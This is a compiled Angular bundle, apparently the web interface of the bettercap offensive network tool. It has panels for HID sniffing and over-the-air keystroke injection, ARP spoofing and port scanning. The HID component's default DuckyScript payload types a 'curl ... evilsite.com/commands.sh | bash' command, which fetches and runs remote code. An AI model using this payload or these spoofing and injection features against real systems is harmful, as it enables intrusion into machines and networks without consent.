        if (tag == 'wifi.client.handshake')
            return 'danger';
        tag = tag.split('.')[0];
        switch (tag) {
            case 'wifi': return 'success';
            case 'endpoint': return 'secondary';
            case 'ble': return 'primary';
            case 'hid': return 'warning';
            default: return 'dark';
        }
    };
    EventsTableComponent.prototype.showEvent = function (event) {
        this.curEvent = event;
        $('#eventModal').modal('show');
    };
    EventsTableComponent.prototype.curEventData = function () {
        if (this.curEvent) {
            return JSON.stringify(this.curEvent.data, null, 2);
        }
        return '';
    };
    EventsTableComponent.prototype.clear = function () {
        this.api.clearEvents();
        this.events = [];
    };
    EventsTableComponent.prototype.toggleModule = function () {
        var toggle = this.api.module('events.stream').running ? 'off' : 'on';
        var enabled = toggle == 'on' ? true : false;
        this.api.cmd("events.stream " + toggle);
        this.modEnabled = enabled;
    };
    EventsTableComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-events-table',
            template: __webpack_require__(/*! ./events-table.component.html */ "./src/app/components/events-table/events-table.component.html"),
            styles: [__webpack_require__(/*! ./events-table.component.scss */ "./src/app/components/events-table/events-table.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_2__["ApiService"], _services_sort_service__WEBPACK_IMPORTED_MODULE_3__["SortService"], _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__["OmniBarService"]])
    ], EventsTableComponent);
    return EventsTableComponent;
}());



/***/ }),

/***/ "./src/app/components/hid-table/hid-table.component.html":
/*!***************************************************************!*\
  !*** ./src/app/components/hid-table/hid-table.component.html ***!
  \***************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"table-responsive\">\n  <table class=\"table table-dark table-sm\">\n    <thead>\n      <tr>\n        <th width=\"1%\" sortable-column=\"address\" sort-direction=\"asc\">Address</th>\n        <th sortable-column=\"type\">Type</th>\n        <th width=\"1%\" sortable-column=\"payloads\">Data</th>\n        <th width=\"1%\" sortable-column=\"channels\">Channels</th>\n        <th width=\"1%\" class=\"nowrap\" sortable-column=\"last_seen\">Seen</th>\n      </tr>\n    </thead>\n    <tbody>\n\n      <tr *ngIf=\"devices.length == 0\">\n        <td colspan=\"4\" align=\"center\">\n          <i>empty</i>\n        </td>\n      </tr>\n\n      <tr *ngFor=\"let device of devices | search: omnibar.query\" [class.alive]=\"device | alive:5000\">\n        <td class=\"nowrap\">\n          <span *ngIf=\"state.sniffing == device.address\">\n            {{ device.address | uppercase }}\n\n            <span *ngIf=\"device.alias\" (click)=\"setAlias(device)\" class=\"badge badge-pill badge-secondary\" style=\"margin-left:5px; cursor: pointer\">\n              {{ device.alias }}\n            </span>\n\n            <span class=\"badge badge-pill badge-warning\" style=\"margin-left: 5px\">\n              <span class=\"spinner-border spinner-border-sm\" style=\"font-size:.7rem\" role=\"status\" aria-hidden=\"true\"></span>\n              <span *ngIf=\"state.injecting\">\n                injecting ...\n              </span>\n              <span *ngIf=\"!state.injecting\">\n                sniffing ...\n                <a style=\"cursor: pointer\" (click)=\"api.cmd('hid.sniff clear')\" ngbTooltip=\"Stop sniffing\">\n                  <i class=\"fas fa-stop\"></i> \n                </a>\n              </span>\n            </span>\n          </span>\n\n          <div *ngIf=\"state.sniffing != device.address\" ngbDropdown [open]=\"visibleMenu == device.address\">\n            <button class=\"btn btn-sm btn-dark btn-action\" ngbDropdownToggle (click)=\"visibleMenu = (visibleMenu == device.address ? null : device.address)\">\n              {{ device.address | uppercase }}\n            </button>\n            <div ngbDropdownMenu class=\"menu-dropdown\">\n              <ul>\n                <li>\n                  <a (click)=\"visibleMenu = null; clipboard.copy(device.address.toUpperCase())\">Copy</a>\n                </li>\n                <li>\n                  <a (click)=\"visibleMenu = null; api.cmd('hid.sniff ' + device.address);\">Sniff</a>\n                </li>\n                <li>\n                  <a (click)=\"visibleMenu = null; showInjectModal(device);\">Inject Script</a>\n                </li>\n                <li>\n                  <a (click)=\"visibleMenu = null; setAlias(device)\">Set Alias</a>\n                </li>\n              </ul>\n            </div>\n\n            <span *ngIf=\"device.alias\" (click)=\"setAlias(device)\" class=\"badge badge-pill badge-secondary\" style=\"margin-left:5px; cursor: pointer\">\n              {{ device.alias }}\n            </span>\n          </div>\n        </td>\n        <td [class.empty]=\"!device.type\">\n          {{ device.type ? device.type : 'unknown'}}\n        </td>\n        <td [class.empty]=\"device.payloads_size == 0\" class=\"nowrap\">\n          <span *ngIf=\"device.payloads_size == 0\">0</span>\n\n          <div ngbDropdown *ngIf=\"device.payloads_size > 0\">\n            <button  \n             class=\"btn btn-sm badge badge-warning btn-action drop-small\"\n             ngbTooltip=\"Show payloads for this device.\"\n             (click)=\"showPayloadsModal(device)\">\n              {{ device.payloads_size | size }}\n              <i class=\"fas fa-eye\"></i>\n            </button>\n          </div>\n\n        </td>\n        <td class=\"nowrap\">{{ device.channels.join(', ') }}</td>\n        <td class=\"nowrap time\">{{ device.last_seen | date: 'HH:mm:ss' }}</td>\n      </tr>\n    </tbody>\n  </table>\n</div>\n\n<div id=\"injectModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"injectModalTitle\" [ngModel]=\"injDev\" name=\"fieldName\" ngDefaultControl>\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\" id=\"injectModalTitle\">\n          <h6>Over-the-Air DuckyScript Injection</h6>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doInjection()\" name=\"injForm\">\n          <div *ngFor=\"let token of injDev.tokens\" class=\"form-group\">\n            <label for=\"tok{{ token.id }}\">\n              {{ token.label }}\n              <a *ngIf=\"token.id == 'DATA'\" ngbTooltip=\"Open DuckyScript reference documentation.\" href=\"https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript\" target=\"_blank\">\n                <i class=\"fas fa-question-circle\"></i>\n              </a>\n            </label>\n            <ng-container [ngSwitch]=\"token.id\">\n              <select *ngSwitchCase=\"'LAYOUT'\" class=\"form-control param-input\" id=\"tok{{ token.id }}\" name=\"tok{{ token.id }}\">\n                <option *ngFor=\"let l of state.layouts\" value=\"{{ l }}\" [selected]=\"l == 'US'\">{{ l }}</option>\n              </select>\n\n              <textarea \n                *ngSwitchCase=\"'DATA'\" \n                rows=\"10\" \n                id=\"tok{{ token.id }}\" \n                name=\"tok{{ token.id }}\" \n                class=\"form-control param-input\" \n                style=\"font-size:.8rem\" required>{{ token.value }}</textarea>\n\n              <input *ngSwitchDefault type=\"text\" id=\"tok{{ token.id }}\" name=\"tok{{ token.id }}\" class=\"form-control param-input\" value=\"{{ token.value }}\" required>\n            </ng-container>\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" name=\"injBtn\" class=\"btn btn-sm btn-warning\">\n              <i class=\"fas fa-play\"></i> Run\n            </button> \n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n\n<div id=\"payloadsModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"payloadsModalTitle\" [ngModel]=\"curDev\" name=\"fieldName\" ngDefaultControl>\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\" id=\"payloadsModalTitle\">\n          <h5>Last {{ curDev.payloads.length }} payloads of {{ curDev.payloads_size | size }}</h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\" style=\"max-height:600px; overflow-y: scroll\">\n        <span *ngFor=\"let p of curDev.payloads\" class=\"payload\">\n          {{ p.split(' ').splice(1).join(' ') }}<br/>\n        </span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<div id=\"inputModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"inputModalTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\">\n          <h5 id=\"inputModalTitle\"></h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doSetAlias()\">\n          <div class=\"form-group row\">\n            <div class=\"col\">\n              <input type=\"text\" class=\"form-control param-input\" id=\"in\" value=\"\">\n              <input type=\"hidden\" id=\"inhost\" value=\"\">\n            </div>\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" class=\"btn btn-dark\">Ok</button>\n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n"

/***/ }),

/***/ "./src/app/components/hid-table/hid-table.component.scss":
/*!***************************************************************!*\
  !*** ./src/app/components/hid-table/hid-table.component.scss ***!
  \***************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "*.payload {\n  font-family: \"Roboto Mono\", monospace;\n  font-size: 0.8rem;\n  font-weight: 100;\n  padding: 0;\n  margin: 0;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvaGlkLXRhYmxlL2hpZC10YWJsZS5jb21wb25lbnQuc2NzcyIsInNyYy9hcHAvY29tcG9uZW50cy9oaWQtdGFibGUvaGlkLXRhYmxlLmNvbXBvbmVudC5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0kscUNBQUE7RUFDQSxpQkFBQTtFQUNBLGdCQUFBO0VBQ0EsVUFBQTtFQUNBLFNBQUE7QUNDSiIsImZpbGUiOiJzcmMvYXBwL2NvbXBvbmVudHMvaGlkLXRhYmxlL2hpZC10YWJsZS5jb21wb25lbnQuc2NzcyIsInNvdXJjZXNDb250ZW50IjpbIioucGF5bG9hZCB7XG4gICAgZm9udC1mYW1pbHk6ICdSb2JvdG8gTW9ubycsIG1vbm9zcGFjZTtcbiAgICBmb250LXNpemU6IC44cmVtO1xuICAgIGZvbnQtd2VpZ2h0OiAxMDA7XG4gICAgcGFkZGluZzogMDtcbiAgICBtYXJnaW46IDA7XG59XG4iLCIqLnBheWxvYWQge1xuICBmb250LWZhbWlseTogXCJSb2JvdG8gTW9ub1wiLCBtb25vc3BhY2U7XG4gIGZvbnQtc2l6ZTogMC44cmVtO1xuICBmb250LXdlaWdodDogMTAwO1xuICBwYWRkaW5nOiAwO1xuICBtYXJnaW46IDA7XG59Il19 */"

/***/ }),

/***/ "./src/app/components/hid-table/hid-table.component.ts":
/*!*************************************************************!*\
  !*** ./src/app/components/hid-table/hid-table.component.ts ***!
  \*************************************************************/
/*! exports provided: HidTableComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "HidTableComponent", function() { return HidTableComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_sort_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../../services/sort.service */ "./src/app/services/sort.service.ts");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/omnibar.service */ "./src/app/services/omnibar.service.ts");
/* harmony import */ var _services_clipboard_service__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../../services/clipboard.service */ "./src/app/services/clipboard.service.ts");






var HidTableComponent = /** @class */ (function () {
    function HidTableComponent(api, sortService, omnibar, clipboard) {
        this.api = api;
        this.sortService = sortService;
        this.omnibar = omnibar;
        this.clipboard = clipboard;
        this.devices = [];
        this.hid = null;
        this.visibleMenu = "";
        this.state = {
            sniffing: "",
            injecting: false
        };
        this.injDev = {
            tokens: [],
            address: "",
            payloads: []
        };
        this.curDev = {
            tokens: [],
            address: "",
            payloads: []
        };
        this.sort = { field: 'address', direction: 'asc', type: '' };
        this.update(this.api.session.hid['devices']);
    }
    HidTableComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.api.onNewData.subscribe(function (session) {
            _this.update(session.hid['devices']);
        });
        this.sortSub = this.sortService.onSort.subscribe(function (event) {
            _this.sort = event;
            _this.sortService.sort(_this.devices, event);
        });
    };
    HidTableComponent.prototype.ngOnDestroy = function () {
        this.sortSub.unsubscribe();
    };
    HidTableComponent.prototype.setAlias = function (dev) {
        $('#in').val(dev.alias);
        $('#inhost').val(dev.address);
        $('#inputModalTitle').html('Set alias for ' + dev.address);
        $('#inputModal').modal('show');
    };
    HidTableComponent.prototype.doSetAlias = function () {
        $('#inputModal').modal('hide');
        var mac = $('#inhost').val();
        var alias = $('#in').val();
        if (alias.trim() == "")
            alias = '""';
        this.api.cmd("alias " + mac + " " + alias);
    };
    HidTableComponent.prototype.showInjectModal = function (dev) {
        var pathToken = { label: 'Save As', id: 'PATH', value: '/tmp/bettercap-hid-script.txt' };
        var dataToken = { label: 'Code', id: 'DATA', value: "GUI\n" +
                "DELAY 500\n" +
                "STRING Terminal\n" +
                "DELAY 500\n" +
                "ENTER\n" +
                "DELAY 500\n" +
                "STRING curl -L http://www.evilsite.com/commands.sh | bash\n" +
                "ENTER\n" +
                "STRING exit\n" +
                "ENTER"
        };
        this.injDev = dev;
        this.injDev.tokens = [
            { label: 'Device', id: 'ADDRESS', value: dev.address.toUpperCase() },
            { label: 'Layout', id: 'LAYOUT', value: 'US' },
            pathToken,
            dataToken
        ];
        this.api.readFile(pathToken.value).subscribe(function (val) {
            dataToken.value = String(val);
        }, function (error) {
            $('#injectModal').modal('show');
        }, function () {
            $('#injectModal').modal('show');
        });
    };
    HidTableComponent.prototype.doInjection = function () {
        var _this = this;
        var parts = {};
        for (var i = 0; i < this.injDev.tokens.length; i++) {
            var tok = this.injDev.tokens[i];
            var val = $('#tok' + tok.id).val();
            parts[tok.id] = (val == "" && tok.id != 'DATA' ? '""' : val);
        }
        $('#injectModal').modal('hide');
        this.api.writeFile(parts['PATH'], parts['DATA']).subscribe(function (val) {
            _this.api.cmd('hid.inject ' + parts['ADDRESS'] + ' ' + parts['LAYOUT'] + ' ' + parts['PATH']);
        }, function (error) { }, function () { });
    };
    HidTableComponent.prototype.showPayloadsModal = function (dev) {
        this.curDev = dev;
        $('#payloadsModal').modal('show');
    };
    HidTableComponent.prototype.update = function (devices) {
        this.hid = this.api.module('hid');
        this.state = this.hid.state;
        this.devices = devices;
        this.sortService.sort(this.devices, this.sort);
        if (this.curDev != null) {
            for (var i = 0; i < this.devices.length; i++) {
                var dev = this.devices[i];
                if (dev.address == this.curDev.address) {
                    this.curDev = dev;
                    break;
                }
            }
        }
    };
    HidTableComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-hid-table',
            template: __webpack_require__(/*! ./hid-table.component.html */ "./src/app/components/hid-table/hid-table.component.html"),
            styles: [__webpack_require__(/*! ./hid-table.component.scss */ "./src/app/components/hid-table/hid-table.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_3__["ApiService"], _services_sort_service__WEBPACK_IMPORTED_MODULE_2__["SortService"], _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__["OmniBarService"], _services_clipboard_service__WEBPACK_IMPORTED_MODULE_5__["ClipboardService"]])
    ], HidTableComponent);
    return HidTableComponent;
}());



/***/ }),

/***/ "./src/app/components/lan-table/lan-table.component.html":
/*!***************************************************************!*\
  !*** ./src/app/components/lan-table/lan-table.component.html ***!
  \***************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div *ngIf=\"viewSpoof\" class=\"action-container shadow\">\n  <form (ngSubmit)=\"onSpoofStart()\">\n    <div class=\"form-group\">\n      <label for=\"targets\">arp.spoof.targets\n        <small class=\"text-muted\">\n          Comma separated list of targets for the arp.spoof module.\n        </small>\n      </label>\n      <input type=\"text\" \n        class=\"form-control form-control-sm param-input\" \n        name=\"targets\" \n        id=\"targets\" \n        placeholder=\"Current targets of arp.spoof\" \n        [(ngModel)]=\"spoofOpts.targets\">\n    </div>\n\n    <div class=\"form-group\">\n      <label for=\"targets\">arp.spoof.whitelist\n        <small class=\"text-muted\">\n          Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing.\n        </small>\n      </label>\n      <input type=\"text\" class=\"form-control form-control-sm param-input\" id=\"whitelist\" name=\"whitelist\" [(ngModel)]=\"spoofOpts.whitelist\">\n    </div>\n\n    <div class=\"form-group form-check\">\n      <input type=\"checkbox\" class=\"form-check-input\" id=\"fullDuplex\" name=\"fullDuplex\" [(ngModel)]=\"spoofOpts.fullduplex\">\n      <label class=\"form-check-label\" for=\"fullDuplex\">\n        full-duplex spoofing\n        <small class=\"text-muted\">\n          If set, both the targets and the gateway will be attacked, otherwise only the targets.\n          <strong>If the router has ARP spoofing protections in place this will make the attack fail.</strong>\n        </small>\n      </label>\n    </div>\n\n    <div class=\"form-group form-check\">\n      <input type=\"checkbox\" class=\"form-check-input\" id=\"internal\" name=\"internal\" [(ngModel)]=\"spoofOpts.internal\">\n      <label class=\"form-check-label\" for=\"internal\">\n        spoof local connections\n        <small class=\"text-muted\">\n          If set, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the external networks.\n        </small>\n      </label>\n    </div>\n\n    <div class=\"form-group form-check\">\n      <input type=\"checkbox\" class=\"form-check-input\" id=\"ban\" name=\"ban\" [(ngModel)]=\"spoofOpts.ban\">\n      <label class=\"form-check-label\" for=\"ban\">\n        ban mode\n        <small class=\"text-muted\">\n          If set, packets coming from the targets will not be forwarded and they won't be able to reach the internet.\n        </small>\n      </label>\n    </div>\n\n    <hr/>\n\n    <div class=\"form-group\">\n      <button type=\"submit\" class=\"btn btn-sm btn-warning\">\n        <ng-container *ngIf=\"isSpoofing\">\n          <i class=\"fas fa-redo-alt\"></i>\n          Restart arp.spoof\n        </ng-container>\n        <ng-container *ngIf=\"!isSpoofing\">\n          <i class=\"fas fa-play\"></i>\n          Start arp.spoof\n        </ng-container>\n      </button>\n      <button type=\"button\" class=\"btn btn-sm btn-dark\" style=\"margin-left: 5px\" (click)=\"hideSpoofMenu()\">\n        Cancel\n      </button>\n    </div>\n  </form>\n</div>\n\n<div class=\"table-responsive\">\n  <table class=\"table table-dark table-sm\">\n    <thead>\n      <tr>\n        <th width=\"1%\" class=\"nowrap\" sortable-column=\"ipv4\" sort-type=\"ip\" sort-direction=\"asc\">IP</th>\n        <th width=\"1%\" class=\"nowrap\" sortable-column=\"mac\">MAC</th>\n        <th sortable-column=\"hostname\">Hostname</th>\n        <th sortable-column=\"vendor\">Vendor</th>\n        <th width=\"1%\" class=\"nowrap\" sortable-column=\"sent\">Sent</th>\n        <th width=\"1%\" class=\"nowrap\" sortable-column=\"received\">Recvd</th>\n        <th width=\"1%\" class=\"nowrap\" sortable-column=\"last_seen\">Seen</th>\n        <th>Info</th>\n      </tr>\n    </thead>\n    <tbody>\n      <tr *ngIf=\"hosts.length == 0\">\n        <td colspan=\"6\" align=\"center\">\n          <i>empty</i>\n        </td>\n      </tr>\n\n      <tr *ngFor=\"let host of hosts | search: omnibar.query\" [class.alive]=\"host | alive:1000\">\n        <td class=\"nowrap\">\n          <div *ngIf=\"!scanState.scanning.includes(host.ipv4)\" ngbDropdown [open]=\"visibleMenu == host.mac\">\n            <span>\n              <input \n                *ngIf=\"viewSpoof\"\n                type=\"checkbox\"\n                style=\"margin-right: 15px\"\n                [attr.data-ip]=\"host.ipv4\"\n                class=\"spoof-toggle\"\n                [disabled]=\"host == iface || host == gateway\"\n                (change)=\"updateSpoofingList()\"\n                [checked]=\"isSpoofed(host)\">\n\n              <button class=\"btn btn-sm btn-dark btn-action\" ngbDropdownToggle (click)=\"visibleMenu = (visibleMenu == host.mac ? null : host.mac)\">\n                {{ host.ipv4 }}\n              </button>\n              <div ngbDropdownMenu class=\"menu-dropdown\">\n                <ul>\n                  <li>\n                    <a (click)=\"visibleMenu = null; clipboard.copy(host.ipv4)\">Copy</a>\n                  </li>\n                  <li>\n                    <a (click)=\"visibleMenu = null; showScannerModal(host)\">Scan Ports</a>\n                  </li>\n                  <li *ngIf=\"isSpoofed(host)\">\n                    <a (click)=\"showSpoofMenuFor(host, false)\">Remove from arp.spoof.targets</a>\n                  </li>\n                  <li *ngIf=\"!isSpoofed(host)\">\n                    <a (click)=\"showSpoofMenuFor(host, true)\">Add to arp.spoof.targets</a>\n                  </li>\n                </ul>\n              </div>\n\n              <i *ngIf=\"isSpoofed(host)\" style=\"margin-left: 5px; color: #d2322d\" ngbTooltip=\"Part of arp.spoof.targets\" class=\"fas fa-radiation\"></i>\n\n            </span>\n          </div>\n\n          <span *ngIf=\"scanState.scanning.includes(host.ipv4)\">\n            {{ host.ipv4 }}\n            <span class=\"badge badge-pill badge-warning\" style=\"margin-left: 5px\" ngbTooltip=\"Scanning {{ scanState.progress }}% ...\">\n              <span class=\"spinner-border spinner-border-sm\" style=\"font-size:.7rem\" role=\"status\" aria-hidden=\"true\"></span>\n              {{ scanState.progress | number:'1.0-0' }}%\n              <a style=\"cursor: pointer\" (click)=\"api.cmd('syn.scan stop')\" ngbTooltip=\"Stop scan\">\n                <i class=\"fas fa-stop\"></i> \n              </a>\n            </span>\n          </span>\n\n        </td>\n        <td>\n          <div ngbDropdown [open]=\"visibleMenu == host.mac + 'mac'\">\n            <button class=\"btn btn-sm btn-dark btn-action\" ngbDropdownToggle (click)=\"visibleMenu = (visibleMenu == host.mac + 'mac' ? null : host.mac + 'mac')\">\n              {{ host.mac | uppercase }}\n            </button>\n            <div ngbDropdownMenu class=\"menu-dropdown\">\n              <ul>\n                <li>\n                  <a (click)=\"visibleMenu = null; clipboard.copy(host.mac.toUpperCase())\">Copy</a>\n                </li>\n                <li>\n                  <a (click)=\"visibleMenu = null; setAlias(host)\">Set Alias</a>\n                </li>\n              </ul>\n            </div>\n          </div>\n        </td>\n        <td [class.empty]=\"!host.hostname && !host.alias\">\n          {{ host.hostname }}\n          \n          <span *ngIf=\"host.alias\" (click)=\"setAlias(host)\" class=\"badge badge-pill badge-secondary\" style=\"cursor: pointer\">\n            {{ host.alias }}\n          </span>\n        </td>\n        <td [class.empty]=\"!host.vendor\">{{ host.vendor ? host.vendor : 'unknown' }}</td>\n        <td [class.empty]=\"!host.sent\" class=\"nowrap\">{{ host.sent | size }}</td>\n        <td [class.empty]=\"!host.received\" class=\"nowrap\">{{ host.received | size }}</td>\n        <td class=\"time\">{{ host.last_seen | date: 'HH:mm:ss'}}</td>\n        <td class=\"metas nowrap\">\n\n          <span *ngIf=\"host.mac == iface.mac\" class=\"badge badge-secondary btn-tiny\">interface</span>\n          <span *ngIf=\"host.mac == gateway.mac\" class=\"badge badge-secondary btn-tiny\">gateway</span>\n\n          <span *ngFor=\"let group of groupMetas(host.meta.values) | keyvalue\" class=\"btn-group drop-left\">\n\n            <div ngbDropdown [open]=\"visibleMeta == host.mac+group.key\" placement=\"left\">\n              <button ngbDropdownToggle \n                class=\"btn btn-sm badge badge-warning btn-action drop-small btn-tiny\"\n                [class.badge-danger]=\"group.key == 'PORTS'\"\n                (click)=\"visibleMeta = (visibleMeta == host.mac+group.key ? null : host.mac+group.key)\">\n                {{ group.key }}\n              </button>\n\n              <div ngbDropdownMenu class=\"menu-dropdown\">\n                <table class=\"table table-sm table-dark\">\n                  <tbody>\n                    <ng-container *ngIf=\"group.key == 'PORTS'\">\n                      <tr *ngFor=\"let port of host.meta.values.ports | keyvalue\">\n                        <td>{{ port.value.port }}</td>\n                        <td [class.empty]=\"port.value.service == ''\">{{ port.value.service ? port.value.service : '?' }}</td>\n                        <td class=\"text-muted\">{{ port.value.proto }}</td>\n                        <td [class.empty]=\"port.value.banner == ''\">{{ port.value.banner ? port.value.banner : 'no banner' }}</td>\n                      </tr>\n                    </ng-container>\n\n                    <ng-container *ngIf=\"group.key != 'PORTS'\">\n                      <tr *ngFor=\"let item of group.value | keyvalue\">\n                        <th>{{ item.key == undefined || item.key === 'undefined' ? '' : item.key }}</th>\n                        <td>{{ item.value }}</td>\n                      </tr>\n                    </ng-container>\n                  </tbody>\n                </table>\n              </div>\n\n            </div>\n\n          </span>\n\n        </td>\n      </tr>\n    </tbody>\n  </table>\n</div>\n\n<div id=\"scannerModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"scannerModalTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\" id=\"scannerModalTitle\">\n          <h5>Select Ports</h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doPortScan()\">\n          <div class=\"form-group row\">\n            <label for=\"scanIP\" class=\"col-sm-1 col-form-label\">IP</label>\n            <div class=\"col-sm\">\n              <input type=\"text\" class=\"form-control param-input\" id=\"scanIP\" value=\"\">\n            </div>\n          </div>\n          <div class=\"form-group row\">\n            <label for=\"startPort\" class=\"col-sm-1 col-form-label\">Start</label>\n            <div class=\"col-sm\">\n              <input type=\"number\" min=\"1\" max=\"65535\" class=\"form-control param-input\" id=\"startPort\" value=\"1\">\n            </div>\n            <label for=\"endPort\" class=\"col-sm-1 col-form-label\">End</label>\n            <div class=\"col-sm\">\n              <input type=\"number\" min=\"1\" max=\"65535\" class=\"form-control param-input\" id=\"endPort\" value=\"1000\">\n            </div>\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" class=\"btn btn-dark\">Scan</button>\n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n\n<div id=\"inputModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"inputModalTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\">\n          <h5 id=\"inputModalTitle\"></h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doSetAlias()\">\n          <div class=\"form-group row\">\n            <div class=\"col\">\n              <input type=\"text\" class=\"form-control param-input\" id=\"in\" value=\"\">\n              <input type=\"hidden\" id=\"inhost\" value=\"\">\n            </div>\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" class=\"btn btn-dark\">Ok</button>\n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n"

/***/ }),

/***/ "./src/app/components/lan-table/lan-table.component.scss":
/*!***************************************************************!*\
  !*** ./src/app/components/lan-table/lan-table.component.scss ***!
  \***************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".paused:after {\n  font-family: \"Font Awesome 5 Free\";\n  font-weight: 900;\n  content: \"\\f04c\";\n  position: absolute;\n  font-size: 400px;\n  top: 50%;\n  left: 50%;\n  -webkit-transform: translate(-50%, -50%);\n          transform: translate(-50%, -50%);\n  opacity: 0.02;\n  color: white;\n  z-index: 1000;\n  pointer-events: none;\n}\n\ndiv.table-responsive {\n  min-height: 600px;\n  overflow: initial;\n}\n\n.table .table {\n  background-color: #313539;\n}\n\ndiv.table-dropdown {\n  z-index: 1000;\n  position: absolute;\n  right: 0;\n  padding: 5px;\n  border: 1px solid #212529;\n  border-radius: 3px;\n  background-color: #313539;\n  display: table;\n  font-size: 0.8rem;\n}\n\ndiv.menu-dropdown {\n  z-index: 99999;\n  padding: 5px;\n  border: 1px solid #212529;\n  border-radius: 3px;\n  background-color: #313539;\n  font-size: 0.8rem;\n}\n\ndiv.menu-dropdown ul li {\n  padding: 5px;\n  cursor: pointer;\n}\n\ndiv.menu-dropdown ul li:hover {\n  background-color: #414549;\n}\n\ndiv.menu-dropdown ul li a {\n  color: white !important;\n  width: 100% !important;\n  display: block;\n  cursor: pointer;\n}\n\ndiv.menu-dropdown ul li a:hover {\n  text-decoration: none;\n}\n\n.drop-left {\n  right: auto;\n  left: 0;\n}\n\ntr.alive {\n  background-color: #313539;\n}\n\ntr.alive td.time {\n  font-weight: bold;\n}\n\ntd.nowrap,\nth.nowrap,\ntr.nowrap {\n  white-space: nowrap;\n}\n\ntable.table-dark tbody tr:hover {\n  background-color: rgba(38, 45, 53, 0.95);\n}\n\ntd.metas .badge {\n  margin-left: 5px;\n}\n/*# 